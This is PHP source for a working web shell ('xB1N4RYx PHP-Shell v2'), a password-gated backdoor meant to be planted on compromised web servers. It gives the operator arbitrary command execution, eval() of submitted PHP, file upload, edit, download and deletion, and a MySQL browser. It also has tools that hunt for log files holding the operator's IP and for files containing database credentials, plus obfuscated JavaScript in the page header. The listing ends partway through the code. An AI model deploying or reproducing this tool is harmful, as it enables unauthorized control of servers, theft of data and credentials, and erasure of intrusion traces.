<?php
$u = "hf";
$p = "123e6b6dac9310d2752a16d523bcbda9dd760d1adab999c97836eb7fcae2935f5be801b3fcbaec7bcd7ee6933b9271b99dc2cd861db4b9f5a80ac079baf3027c";

ob_start();
session_start(); 
@set_magic_quotes_runtime(0);
set_time_limit(0);
error_reporting(0);
$windows = 0;

function recurse_zip($src,&$zip,$path_length) {
        $dir = opendir($src);
        while(false !== ( $file = readdir($dir)) ) {
            if (( $file != '.' ) && ( $file != '..' )) {
                if ( is_dir($src . '/' . $file) ) {
                    recurse_zip($src . '/' . $file,$zip,$path_length);
                }
                else {
                    $zip->addFile($src . '/' . $file,substr($src . '/' . $file,$path_length));
                }
            }
        }
        closedir($dir);
}
function compress($src, $xX)
{
        if(substr($src,-1)==='/'){$src=substr($src,0,-1);}
        $arr_src=explode('/',$src);
        $filename=$src;
        unset($arr_src[count($arr_src)-1]);
        $path_length=strlen(implode('/',$arr_src).'/');
        $f=explode('.',$filename);
        $filename=$f[0];
        $filename=(($filename=='')? $xX : $xX);
        $zip = new ZipArchive;
        $res = $zip->open($filename, ZipArchive::CREATE);
        if($res !== TRUE){
                echo 'Error: Unable to create zip file';
                exit;}
        if(is_file($src)){$zip->addFile($src,substr($src,$path_length));}
        else{
                if(!is_dir($src)){
                     $zip->close();
                     @unlink($filename);
                     echo 'Error: File not found';
                     exit;}
        recurse_zip($src,$zip,$path_length);}
        $zip->close();
        //exit;
}

function get_string_between($string, $start, $end){
	$string = " ".$string;
	$ini = strpos($string,$start);
	if ($ini == 0) return "";
	$ini += strlen($start);
	$len = strpos($string,$end,$ini) - $ini;
	return substr($string,$ini,$len);
}

function func_enabled($func){
    $disabled = explode(',', ini_get('disable_functions'));
    foreach ($disabled as $dis){
        if($dis == $func)
		return false;
    }
    return true;
}

function binary_shell($cmd){
	if(func_enabled("shell_exec"))
		return shell_exec($cmd);
	else if(func_enabled("exec"))
		return exec($cmd);
	else if(func_enabled("system"))
		return system($cmd);
	else if(func_enabled("passthru"))
		return passthru($cmd);
}

function fExt($filename)
{
    $path_info = pathinfo($filename);
    return $path_info['extension'];
}

$images = array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff");
$movies = array("avi","mpg","mpeg");

$user = $_POST['zun'];
$pass = hash("sha512", $_POST['zpw']);
$pazz = $p;

if($_SESSION['zusrn'] != $u || $_SESSION['zpass'] != $pazz)
{
	$_SESSION['zusrn'] = $user;
	$_SESSION['zpass'] = $pass;
}

if($_GET['page'] == "phpinfo"){
	if($_SESSION['zusrn'] == $u && $_SESSION['zpass'] == $pazz){
	echo '<title>xB1N4RYx</title>';
	phpinfo();
	return;}
}
echo '
<html>
<head>
<title>xB1N4RYx</title>
<script type="text/javascript" language="javascript">
<!--
ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
OT="";
for(j=0;j<MI.length;j++){
OT+=ML.charAt(MI.charCodeAt(j)-48);
}document.write(OT);
// --></script>
</head>
<style>
hr{
	border: 1px solid #444444;
}
body{
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 11px;
}

table{
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 11px;
}

a:link{
text-decoration: none;
font-weight: bold;
color: #888888;
}

a:visited{
text-decoration: none;
font-weight: normal;
color: #888888;
}

a:active{
text-decoration: none;
font-weight: normal;
color: #CC0000;
}

a:hover{
text-decoration: bold;
font-weight: bold;
color: #666666;
}

#links{
margin-top: 12px;
margin-left: 10px;
}

textarea{
border: 1px solid #770000;
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 10px;
}

#crypts{
margin-top: -6px;
}

#crypts input{
color: #CCCCCC;
background: #000000;
border: 0px;
text-align: center;
}

#submit input{
color: #CCCCCC;
background: #000000;
border: 1px solid #770000;
text-align: center;
}

#submits{
margin-top: -24px;
margin-left: 359px;
}

#text input{
color: #CCCCCC;
background: #000000;
border: 1px solid #770000;
text-align: left;
}

#dirs a:link{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #008888;
}

#dirs a:visited{
text-decoration: none;
font-size: 10px;
font-weight: none;
color: #008888;
}

#dirs a:active{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #008888;
}

#dirs a:hover{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #006666;
}

#files a:link{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #CCCCCC;
}

#files a:visited{
text-decoration: none;
font-size: 10px;
font-weight: none;
color: #CCCCCC;
}

#files a:active{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #CCCCCC;
}

#files a:hover{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #888888;
}

#pd a:link{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:visited{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:active{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:hover{
text-decoration: none;
font-weight: none;
color: #0055AA;
}

#login input{
color: #CCCCCC;
background: #000000;
border: 1px solid #660000;
border-radius: 5px;
text-align: center;
}

#phpe textarea{
color: #CCCCCC;
background: #000000;
border: 1px solid #660000;
border-radius: 7px;
text-align: center;
}

#cpath a:link{
color: #0066BB;
}

#cpath a:visited{
color: #0066BB;
}

#cpath a:active{
color: #0066BB;
}

#cpath a:hover{
color: #0077CC;
}

</style>
<body>';

function endsWith($haystack, $needle)
{
    $length = strlen($needle);
    $start  = $length * -1; //negative
    return (substr($haystack, $start) === $needle);
}
if(endsWith($_GET['dir'], "\\")){ $dslash = ""; }
else{ $dslash = "/"; }
if(endsWith(realpath($_SESSION['current_folder']), "/") || endsWith(realpath($_SESSION['current_folder']), "\\")){ $cslash = ""; }
else{ $cslash = "/"; }
if($_GET['page'] == "list"){
if(!isset($_SESSION['current_folder'])){ $_SESSION['current_folder'] = "./"; }
else{
if(is_dir(realpath($_SESSION['current_folder']).$cslash.$_GET['dir']))
	$_SESSION['current_folder'] = realpath($_SESSION['current_folder']).$cslash.$_GET['dir'];
}
}
echo '
<table border="0" style="border: 0px solid #444444;" width="100%" height="100px">
<tr>
<td width="110px" style="text-align: right; padding-right: 5px;" valign="top">
<b><font color="#555555">
Software:&nbsp;<br>OS:&nbsp;<br>User:&nbsp;<br>PHP Version:&nbsp;<br>MySQL Version:&nbsp;<br>Server IP:&nbsp;<br>Safemode:&nbsp;<br>Disabled Funcs:&nbsp;<br>Disk Info:&nbsp;<br>Current Folder:&nbsp;<br>Shell Folder:&nbsp;
</font></b>
</td>
<td valign="top">
<b><font color="#777777" valign="top">';
$ts = disk_total_space("/")/1024/1024/1024;// IN GB
$fs = disk_free_space("/")/1024/1024/1024;// IN GB
$soft = str_replace("PHP/".phpversion()."", "", getenv("server_software"));
echo $soft.'<br>';
echo wordwrap(php_uname(),90," ",1).'<br>';
echo binary_shell("id").'<br>';
echo phpversion().'<br>';
echo mysql_get_client_info().'<br>';
echo getenv("server_name").'&nbsp;/&nbsp;'.gethostbyname(getenv("server_name")).'<br>';
if (strtolower(@ini_get("safe_mode")) == "on" || @ini_get("safe_mode") == true)
{ echo '<font color="#990000">On</font><br>'; }
else{ echo '<font color="#009900">Off</font><br>'; }
if(@ini_get("disable_functions") == "")
	echo "<font color='#009900'>None</font><br>";
else
	echo '<font color="#990000">'.@ini_get("disable_functions").'</font><br>';
echo round($fs, 2).'&nbsp;GB&nbsp;Free'.'&nbsp;of&nbsp;Total&nbsp;'.round($ts, 2).'&nbsp;GB'.'&nbsp;('.round(100/($ts/$fs), 2).'%)<br>';
if(preg_match("/\//i", realpath($_SESSION['current_folder']))){
	$cpaths = explode('/', realpath($_SESSION['current_folder']));
	$pathslash = '/';
}
else{
	$cpaths = explode('\\', realpath($_SESSION['current_folder']));
	$pathslash = '\\';
}
echo '<div id="cpath">';
$asdAsD = 0;
foreach($cpaths as $paths){
	$buffer .= $paths.$pathslash;
	if($asdAsD <= count($cpaths)-2){
		echo '<a href="?page=go&goto='.$buffer.'">'.$paths.'</a><font color="#0066BB">'.$pathslash.'</font>';
	}
	else{
		echo '<a href="?page=go&goto='.$buffer.'">'.$paths.'</a>';
	}
	$asdAsD++;
}
echo '</div>';
//'.realpath($_SESSION['current_folder']).'
//echo '<div id="cpath">';
//echo ''.realpath($_SESSION['current_folder']).'</a></div>';
//echo '<div id="cpath"><a href="?page=go&goto=/">'.realpath($_SESSION['current_folder']).'</a></div>';
echo '<font color="#6C1B0A">'.realpath("./").'</font><br>';
echo '
</font></b>
</td>
<td style="text-align: right; padding-right: 5px;" valign="top">';

echo '<b><font color="#555555">Your IP: <font color="#777777">'.getenv("remote_addr").'</font></font></b>';
if($_SESSION['zusrn'] == $u && $_SESSION['zpass'] == $pazz)
	echo '<br><a href="?page=logout">Logout</a>';
if(isset($_SESSION['muser']))
	echo '<br><a href="?page=mylogout">MySQL Logout</a>';
	
echo '
</td>
</tr>

</table>
<div id="links">
<a href="?page=list">List Files</a>&nbsp;&nbsp;&nbsp;
<a href="?page=crypt">Encrypt</a>&nbsp;&nbsp;&nbsp;
<a href="?page=shell">Shell Execute</a>&nbsp;&nbsp;&nbsp;
<a href="?page=go">Go To</a>&nbsp;&nbsp;&nbsp;
<a href="?page=cf">Create File</a>&nbsp;&nbsp;&nbsp;
<!--<a href="?page=df">Delete File</a>&nbsp;&nbsp;&nbsp;-->
<a href="?page=cfo">Create Folder</a>&nbsp;&nbsp;&nbsp;
<!--<a href="?page=dfo">Delete Folder</a>&nbsp;&nbsp;&nbsp;-->
<a href="?page=mysql">MySQL Manager</a>&nbsp;&nbsp;&nbsp;
<a href="?page=php">PHP Executer</a>&nbsp;&nbsp;&nbsp;
<a href="?page=phpinfo" target="_blank">PHP Info</a>&nbsp;&nbsp;&nbsp;
<a href="?page=upload">Upload File</a>&nbsp;&nbsp;&nbsp;
<a href="?page=bcon">Back Connect</a>&nbsp;&nbsp;&nbsp;
<a href="?page=sr"><font color="#CC0000">!</font> Self Remove <font color="#CC0000">!</font></a>&nbsp;&nbsp;&nbsp;
<a href="?page=findlogs"><font color="#0189d2">!</font> Log Finder <font color="#0189d2">!</font></a>&nbsp;&nbsp;&nbsp;
<a href="?page=findmysql"><font color="#02fe28">!</font> MySQL PW Finder <font color="#02fe28">!</font></a>&nbsp;&nbsp;&nbsp;
</div>
<br>

<table border="0" style="border: 1px solid #444444; padding: 5px;" width="100%">
<tr>
<td valign="top">';

if($_SESSION['zusrn'] != $u || $_SESSION['zpass'] != $pazz)
{
echo '<form action="'.$php_self.'" method="post">';
echo '<center>';
echo 'xB1N4RYx PHP-Shell v2<br><br>';
echo 'Username:<br><div id="login"><input type="text" id="zun" name="zun" maxlength="10"/><br><br>';
echo 'Password:<br><input type="password" id="zpw" name="zpw" maxlength="10"/><br>';
echo '</div><div id="submit"><input type="submit" value="Login"/>';
echo '</div>';
echo '</center>';
echo '</form>';
return;
}

function fsize($file){
if(filesize($file) == 0)
	return "~";
if(filesize($file) < 0)
	return "2 GB+";
if(round(filesize($file)/1024/1024, 1) >= 1024)
	return round(filesize($file)/1024/1024/1024, 1)." GB";
if(round(filesize($file)/1024, 1) >= 1024)
	return round(filesize($file)/1024/1024, 1)." MB";
return round(filesize($file)/1024, 1)." KB";
}

switch($_GET['page']){
	default:
		echo '<center>xB1N4RYx PHP-Shell v2</center>';
	break;

	case "findlogs":
		$fi = fopen("log.pl","w");
		fwrite($fi,'system("cd '.realpath($_SESSION['current_folder']).' && find | xargs grep \'".$ARGV[0]."\'");');
		fclose($fi);
		$sh = binary_shell("perl log.pl ".getenv("remote_addr"));
		$files = explode("\r\n",$sh);
		echo "<center>Possible log files:<br><br>";
		foreach($files as $file){
			$f = get_string_between($file,"/",":");
			$fa = '/'.get_string_between($file,"/","No such file");
			if($f != "")
				echo str_replace("//","/",realpath($_SESSION['current_folder']).'/'.$f)."<br>";
		}
		echo "</center>";
		unlink("log.pl");
	break;
	
	case "findmysql":
		$fi = fopen("sql.pl","w");
		fwrite($fi,'system("cd '.realpath($_SESSION['current_folder']).' && find | xargs grep \'".$ARGV[0]."\'");');
		fclose($fi);
		$sh = binary_shell("perl sql.pl mysql_connect");
		$files = explode("\r\n",$sh);
		echo "<center>Possible mysql password files:<br><br>";
		foreach($files as $file){
			$f = get_string_between($file,"/",":");
			$fa = '/'.get_string_between($file,"/","No such file");
			if($f != "")
				echo str_replace("//","/",realpath($_SESSION['current_folder']).'/'.$f)."<br>";
		}
		echo "</center>";
		unlink("sql.pl");
	break;

	case "removelogs":
		
	break;
	
	case "list":
		$dir = @opendir($_SESSION['current_folder']);
		$xazz = 0;
		if(!$dir){ $_SESSION['current_folder'] = "./"; }
		echo '<table border="0" width="100%" cellspacing="0">';
		echo '<tr><td width="35%"><div id="pd"><a href="?page=list&dir=..">&nbsp;&nbsp;&nbsp;Parent Directory</a></div></td><td width="20%"><center>File Size</center></td><td width="15%"><center>Extra Options</center></td><td width="15%"><center>Permissions</center></td><td width="*"><center>Options</center></td></tr>';
		while (($dirs = @readdir($dir)) != false){
			$color = array("#000000","#111111","#444444");
		if(is_dir(realpath($_SESSION['current_folder'])."/".$dirs) && $dirs != "." && $dirs != ".."){
			if($xazz == 1)
				$xazz--;
			else
				$xazz++;
			echo '<tr bgcolor="'.$color[$xazz].'" onMouseOver="this.bgColor=\''.$color[2].'\'" onMouseOut="this.bgColor=\''.$color[$xazz].'\'"><td><div id="dirs"><a href="?page=list&dir='.$dirs.'">'.$dirs.'</a></div></td><td><center>&nbsp;</center></td><td>&nbsp;</td><td>&nbsp;</td><td><center><a href="?page=downloadzip&f='.$dirs.'">Download</a>&nbsp;~&nbsp;<a href="?page=dfo&f='.$dirs.'">Delete</a></center></td></tr>';
		}}
		echo '<tr><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td></tr>';
		$nondir = @opendir(realpath($_SESSION['current_folder']));
		while (($files = @readdir($nondir)) != false){
		if(!is_dir(realpath($_SESSION['current_folder'])."/".$files)){
			if($xazz == 1)
				$xazz--;
			else
				$xazz++;
			echo '<tr bgcolor="'.$color[$xazz].'" onMouseOver="this.bgColor=\''.$color[2].'\'" onMouseOut="this.bgColor=\''.$color[$xazz].'\'"><td><div id="files"><a href="?page=view&file='.$files.'">'.$files.'</a></div></td><td><center>'.fsize(realpath($_SESSION['current_folder']).$cslash.$files).'</center></td>';
			echo '<td>';
			if(is_executable(realpath($_SESSION['current_folder']).$cslash.$files))
				echo '<center><a href="?page=stask&f='.$files.'">Start</a>&nbsp;~&nbsp;<a href="?page=ktask&f='.$files.'">Kill</a></center>';
			else
				echo '&nbsp;';
			$permissions = is_writeable($files);
			if($permissions == true)
				$perms = '<font color="#00CC00"><b>Editable</b></font>';
			else
				$perms = '<font color="#CC0000"><b>Locked</b></font>';
			echo '<td>';
			echo '<center>'.$perms.'</center>';
			echo '</td>';
			echo '</td>';
			echo '<td><center><a href="?page=view&file='.$files.'&fc=1">Edit</a>&nbsp;~&nbsp;<a href="?page=downloadfile&f='.$files.'">Download</a>&nbsp;~&nbsp;<a href="?page=df&f='.$files.'">Delete</a></center></td></tr>';
		}}
		closedir($dir);
		closedir($nondir);
		echo '</table>';
	break;
	
	case "crypt":
		echo '<center>';
			echo '<form action="?page=crypt" method="post">';
			echo 'Input:<br><textarea rows="6" cols="45" id="ctext" name="ctext">'.$_POST['ctext'].'</textarea><br><br>';
			echo '<div id="submit">';
			echo '<input type="submit" value="Hash">';
			echo '</div>';
			echo '</form>';
			echo '<div id="crypts">';
			echo '<p>md5 <br> <input type="text" size="32" readonly value="'.hash("md5", $_POST['ctext']).'"/></p>';
			echo '<p>sha1 <br> <input type="text" size="41" readonly value="'.hash("sha1", $_POST['ctext']).'"/></p>';
			echo '<p>sha256 <br> <input type="text" size="68" readonly value="'.hash("sha256", $_POST['ctext']).'"/></p>';
			echo '<p>sha384 <br> <input type="text" size="103" readonly value="'.hash("sha384", $_POST['ctext']).'"/></p>';
			echo '<p>sha512 <br> <input type="text" size="139" readonly value="'.hash("sha512", $_POST['ctext']).'"/></p>';
			echo '</div>';
			echo '<hr style="border: 1px solid #333333;"/><a href="http://www.md5decrypter.co.uk/sha1-decrypt.aspx" target="_blank">Decrypt SHA1/MD5 Hashes</a>';
		echo '</center>';
	break;
	
	case "shell":
		$sh = binary_shell("cd ".realpath($_SESSION["current_folder"])." && ".$_POST['cmd']);
		echo '<form action="?page=shell" method="post">';
		echo '<textarea rows="10" cols="80" readonly>'.$sh.'</textarea>';
		echo '<br><div id="text">';
		echo '<input type="text" name="cmd" id="cmd" style="margin-top: 3px; border-radius: 3px;" size="53"/>';
		echo '<input type="submit" style="margin-left: 5px; border-radius: 3px; marign-top: 3px;" value="Execute"/>';
		echo '</form>';
	break;
	
	case "view":
		$file = $_GET['file'];
		$fc = $_GET['fc'];
		if(!isset($fc)){ $fc = 0; }
		if(in_array(strtolower(fExt(realpath($_SESSION["current_folder"].$cslash.$file))), $images, true) && $fc != 1){ echo '<center>Viewing Image<br>[ '.$file.' ]<hr/><a href="?page=downloadfile&f='.$file.'"><img src="?page=viewimage&i='.$file.'" border="0" style="padding: 10px;" alt="Download Image"/></a></center>'; break; }
		if(in_array(strtolower(fExt(realpath($_SESSION["current_folder"].$cslash.$file))), $movies, true) && $fc != 1){ echo '<center><a href="?page=downloadfile&f='.$file.'"><object data="?page=viewmovie&i='.$file.'" type="video/quicktime" width="320" height="255"> <param name="src" value="?page=viewmovie&i='.$file.'"><param name="autoplay" value="false"><param name="autoStart" value="0"></object></center>'; break; }
		$fo = @fopen(realpath($_SESSION["current_folder"].$cslash.$file), "r");
		$fr = @fread($fo, filesize(realpath($_SESSION["current_folder"].$cslash.$file)));
		echo '<form action="?page=saveedit" method="post">';
		echo '<center>Editing '.realpath($_SESSION["current_folder"].$cslash.$file).'<br><a href="?page=highlight&file='.$file.'">Highlight PHP</a><br><br><div id="submit"><input type="submit" value="Save"/></div>';
		echo '<textarea rows="54" cols="120" id="ctext" name="ctext">'.htmlspecialchars($fr).'</textarea>';
		echo '<input type="hidden" value="'.$file.'" name="file" id="file" />';
		echo '</center>';
		echo '</form>';
		fclose($fo);
	break;
	
	case "saveedit":
		$fs = $_POST['file'];
		$fd = $_POST['ctext'];
		if (get_magic_quotes_gpc()){
	if (!function_exists("strips")){
		function strips(&$arr,$k=""){
			if (is_array($arr)){
			foreach($arr as $k=>$v){
				if (strtoupper($k) != "GLOBALS"){
					strips($arr["$k"]);
												}
									}
								}
	else{
	$arr = stripslashes($arr);
		}
									}
								   }
	strips($GLOBALS);
}
		
		$fo = @fopen(realpath($_SESSION["current_folder"].$cslash.$fs), "w");
		$fo2 = @fopen(realpath($_SESSION["current_folder"].$cslash.$fs), "r");
		$fw = @fwrite($fo, $fd);
		$fr = @fread($fo2, filesize(realpath($_SESSION["current_folder"].$cslash.$fs)));
		echo '<form action="?page=saveedit" method="post">';
		echo '<center><h3>Saved!</h3>Editing '.realpath($_SESSION["current_folder"].$cslash.$fs).'<br><a href="?page=highlight&file='.$fs.'">Highlight PHP</a><br><br><div id="submit"><input type="submit" value="Save"/></div>';
		echo '<textarea rows="54" cols="120" id="ctext" name="ctext">'.htmlspecialchars($fr).'</textarea>';
		echo '<input type="hidden" value="'.$fs.'" name="file" id="file" />';
		echo '</center>';
		echo '</form>';
		fclose($fo);
		fclose($fo2);
	break;
	
	case "highlight":
		$fil = $_GET['file'];
		$filz = realpath($_SESSION["current_folder"].$cslash.$fil);
		echo '<tr>';
		echo '<center><td bgcolor="#000000">';
		echo '<center>Highlighting '.realpath($_SESSION["current_folder"].$cslash.$fil).'<br><a href="?page=view&file='.$fil.'">Edit</a>';
		echo '</td></tr><tr>';
		echo '<center><td bgcolor="#CCCCCC">';
		$hl = highlight_file($filz, true);
		echo $hl;
		echo '</td></tr></center>';
	break;
	
	case "logout":
		session_destroy();
		echo '<script type="text/javascript">location.href="?page=login";</script>';
	break;
	
	case "mylogout":
		unset($_SESSION['mhost']);
		unset($_SESSION['mport']);
		unset($_SESSION['muser']);
		unset($_SESSION['mpass']);
		unset($_SESSION['mlog']);
		echo '<script type="text/javascript">location.href="?page=mysql";</script>';
	break;
	
	case "go":
		$goto = $_GET['goto'];
		if(!isset($goto)){
			echo '<form action="?page=go" method="get">';
			echo '<div id="login" style="margin-left: 10px; margin-top: 10px;"><input type="hidden" name="page" value="go"/><input type="text" name="goto" id="goto" value="/"/><input type="submit" value="Go"/></div>';
			echo '</form>';
		}
		else{
			$_SESSION["current_folder"] = $goto;
			echo '<script type="text/javascript">location.href="?page=list";</script>';
		}
	break;
	
	case "cf":
		$ff = $_POST['fc'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(file_exists($f)){ echo 'File Already Exists!'; }
			else{
			echo 'Done!';
			$fo = @fopen($f, "w");
			fwrite($fo, "File Created By xB1N4RYx PHP-Shell v2");
			fclose($fo);
			}
		}
		echo '<br>Create File';
		echo '<form action="?page=cf" method="post">';
		echo '<div id="login"><input type="text" name="fc" id="fc" /></div><div id="submit"><input type="submit" value="Create"/></div>';
		echo '</form>';
		echo '</center>';
	break;
	
	case "df":
		$ff = $_GET['f'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(file_exists($f)){
				unlink($f);
				echo 'Done!';
			}
			else{
				echo 'File Doesnt Exist!';
			}
		}
		echo '<br>Delete File';
		echo '<form action="?page=df" method="post">';
		echo '<div id="login"><input type="text" name="fd" id="fd" /></div><div id="submit"><input type="submit" value="Delete"/></div>';
		echo '</form>';
		echo '</center>';
		if(!isset($_GET['noredirect']))
			echo '<script type="text/javascript">location.href="?page=list";</script>';
	break;
	
	case "cfo":
		$ff = $_POST['fco'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(file_exists($f)){ echo 'Folder Already Exists!'; }
			else{
			echo 'Done!';
			mkdir($f, 0777);
			}
		}
		echo '<br>Create Folder';
		echo '<form action="?page=cfo" method="post">';
		echo '<div id="login"><input type="text" name="fco" id="fco" /></div><div id="submit"><input type="submit" value="Create"/></div>';
		echo '</form>';
		echo '</center>';
	break;
	
	case "dfo":
		$ff = $_GET['f'];
		$f = realpath($_SESSION['current_folder'])."/".$ff;
		echo '<center>';
		if(isset($ff)){
			if(!file_exists($f)){ echo 'Folder Doesnt Exist!'; }
			else{
			echo 'Done!';
			rmdir($f);
			}
		}
		echo '<script type="text/javascript">location.href="?page=list";</script>';
	break;
	
	case "php":
		$phpc = $_POST['phpc'];
		echo '<center><b>PHP Code Execution</b><br><br>Result<br><div id="phpe"><textarea rows="5" cols="60" readonly>';
		eval(stripslashes($phpc));
		echo '</textarea><br><br>';
		echo '<form action="?page=php" method="post">';
		echo 'Code<br><textarea rows="5" cols="60" name="phpc" id="phpc"></textarea></div>';
		echo '<div id="submit"><input type="submit" value="Execute!" /></div></form></center>';
	break;
	
	case "mysql":
		$host = $_POST['host'];
		$port = $_POST['port'];
		$user = $_POST['user'];
		$pass = $_POST['pass'];
		if(!isset($_SESSION['muser'])){
		echo '<center><form action="?page=mysql" method="post">';
		echo '<div id="login">';
		echo 'Host:<br><input type="text" id="host" name="host" value="127.0.0.1"/><br><br>';
		echo 'Port:<br><input type="text" id="port" name="port" value="3306"/><br><br>';
		echo 'User:<br><input type="text" id="user" name="user" value="root"/><br><br>';
		echo 'Password:<br><input type="text" id="pass" name="pass"/><br><br>';
		echo '</div>';
		echo '<div id="submit"><input type="submit" value="Connect"/></div>';
		echo '</form></center>';}
//		else{
		if(isset($user)){
			$_SESSION['mhost'] = $host;
			$_SESSION['mport'] = $port;
			$_SESSION['muser'] = $user;
			$_SESSION['mpass'] = $pass;}
			if(isset($_SESSION['muser'])){
				$l = mysql_connect($_SESSION['mhost'].":".$_SESSION['mport'], $_SESSION['muser'], $_SESSION['mpass']);
				if(!$l){
					unset($_SESSION['mhost']);
					unset($_SESSION['mport']);
					unset($_SESSION['muser']);
					unset($_SESSION['mpass']);
					unset($_SESSION['mlog']);
					die("Can't Connect To MySQL");
				}
					if($_SESSION['mlog'] < 1)
						echo '<script type="text/javascript">location.href="?page=mysql";</script>';
					$_SESSION['mlog'] = 1;
				}
//		}
		if(isset($_SESSION['muser'])){
		//if(!isset($_GET['db']) && isset($_POST['user'])){
			$dbs = mysql_query("SHOW DATABASES");
		echo '<table border="0" width="100%"><tr><td width="250px" valign="top" style="border-right: 1px solid #444444;">Databases:<hr style="border: 1px solid #444444;"/>';
		echo '<table border="0">';
		while ($row = mysql_fetch_assoc($dbs)) {
			echo '<tr><td><a href="?page=mysql&a=tables&db='.$row['Database'].'">'.$row['Database'] . '</a></td><td align="right" width="100%">~&nbsp;<a align="right" href="?page=mysql&a=query&db='.$row['Database'].'">Query</a></td></tr>';
		}
		echo '</table>';
		echo '</td><td align="center" valign="top">';
		switch($_GET['a'])
		{
			default:
				echo '&nbsp;<hr/>';
			break;
			
			case "tables":
				$db = $_GET['db'];
				echo 'Tables of '.$_GET['db'].'<hr/>';
				$t = mysql_query("SHOW TABLES FROM ".$_GET['db']);
				while($tb = mysql_fetch_row($t)){
					echo '<a href="?page=mysql&a=columns&table='.$tb[0].'&db='.$db.'">'.$tb[0].'</a><br>';
				}
			break;
			
			case "columns":
			echo 'Data of '.$_GET['table']." @ ".$_GET['db'].'<hr/>';
			echo '<table border="0" height="100%" cellspacing="7px"><tr>';
				$db = $_GET['db'];
				$t = $_GET['table'];
				mysql_select_db($db, $l);
				$c = mysql_query("SHOW COLUMNS FROM ".$t);
				while($cc = mysql_fetch_array($c)){
					echo '<td align="center" style="border: 1px solid #444444; border-radius: 5px;">&nbsp;&nbsp;&nbsp;'.$cc[0].'&nbsp;&nbsp;&nbsp;</td>';
				}
				echo '</tr><tr>';
				$d = mysql_query("SELECT * FROM ".$t);
				while($dd = mysql_fetch_array($d)){
				echo '<tr>';
					for($i = 0; $i <= count($dd)/2-1; $i++){
						echo '<td style="border: 1px solid #444444; border-radius: 5px;" align="center">&nbsp;&nbsp;&nbsp;'.$dd[$i].'&nbsp;&nbsp;&nbsp;</td>';
						//echo '<script type="text/javascript">alert("'.count($dd).'");</script>';
					}
				echo '</tr>';
				}
				echo '</td>';
			echo '</td></tr></table>';
			break;
			
			case "query":
				$db = $_POST['pdb'];
				if(!isset($db))
					$db = $_GET['db'];
				$q = $_POST['query'];
				if(isset($db))
					echo 'Execute Query In '.$db.'<hr/>';
				if(isset($q)){
					mysql_select_db($db, $l);
					mysql_query(stripslashes($q));
					echo 'Done!';
				}
				echo '<form action="?page=mysql&a=query&db='.$db.'" method="post">';
				echo '<textarea rows="10" cols="80" name="query" id="query">'.stripslashes($q).'</textarea>';
				echo '<input type="hidden" name="pdb" id="pdb" value="'.$db.'"/>';
				echo '<div id="submit"><input type="submit" value="Execute"/></div>';
				echo '</form>';
			break;
		}
		echo '</tr></table>';
		}
	break;
	
	case "ktask":
		$f = $_GET['f'];
		$win = binary_shell("taskkill /F /IM ".$f);
		$gpid = binary_shell("pidof ".$f);
		$linux = binary_shell("kill -9 ".$gpid);
		if(isset($win))
			echo "<center>".$win."</center>";
		else
			echo "<center>".$linux."</center>";
	break;
	
	case "stask":
		$f = $_GET['f'];
		$folder = realpath($_SESSION['current_folder'])."/";
		$win = binary_shell("cd ".$folder." && ".$f);
		$linux = binary_shell("cd ".$folder." && "."./".$f);
		if(isset($win))
			echo "<center>".$win."</center>";
		else
			echo "<center>".$linux."</center>";
	break;
	
	case "downloadfile":
	
	$f = $_GET['f'];
	$file = realpath($_SESSION['current_folder'])."/".$f;

		if (file_exists($file)) {
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename='.$f);
			header('Content-Transfer-Encoding: binary');
			header('Expires: 0');
			header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
			header('Pragma: public');
			header('Content-Length: ' . filesize($file));
			ob_clean();
			flush();
			readfile($file);
			exit;
			/*header('Content-disposition: attachment; filename='.$f.'');
			header('Content-type: application/octet-stream');
			ob_clean();
			flush();
			readfile($file);*/
		}
	break;
	
	case "downloadzip":
		//echo '<script type="text/javascript">alert("Delete the ZIPfile after download!");</script>';
		$f = $_GET['f'];
		$file = realpath($_SESSION['current_folder'])."/".$f;
		$fi = realpath("./".$f.'.zip');
		compress($file, $f.'.zip');
			header('Content-Description: File Transfer');
			header('Content-Type: application/zip');
			header('Content-Disposition: attachment; filename='.$f.'.zip');
			header('Content-Transfer-Encoding: binary');
			header('Expires: 0');
			header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
			header('Pragma: public');
			header('Content-Length: ' . filesize($fi));
			ob_clean();
			flush();
			readfile($fi);
			exit;
	break;
	
	case "upload":
		echo '<form action="?page=dupload" method="post" enctype="multipart/form-data"><br>';
		echo 'Select File:<br><br>';
		echo '<input type="file" id="f" name="f"/>';
		echo '<br><br>Upload to:<br><div id="login"><input type="text" id="to" name="to" style="width: 300px;" value="'.realpath($_SESSION['current_folder']).'"/></div><br><div id="submit"><input type="submit" value="Upload"/></div>';
		echo '</form>';
	break;
	
	case "dupload":
		$up = realpath($_POST['to'])."/".basename($_FILES['f']['name']);
		if(move_uploaded_file($_FILES['f']['tmp_name'], $up))
			echo "Upload Successful!";
		else
			echo "Upload Unsuccessful! :(";
	break;
	
	case "sr":
		echo '<center>Do you really want to <a href="?page=selfremove"><font color="#990000">remove this shell</font></a>?</center>';
	break;
	
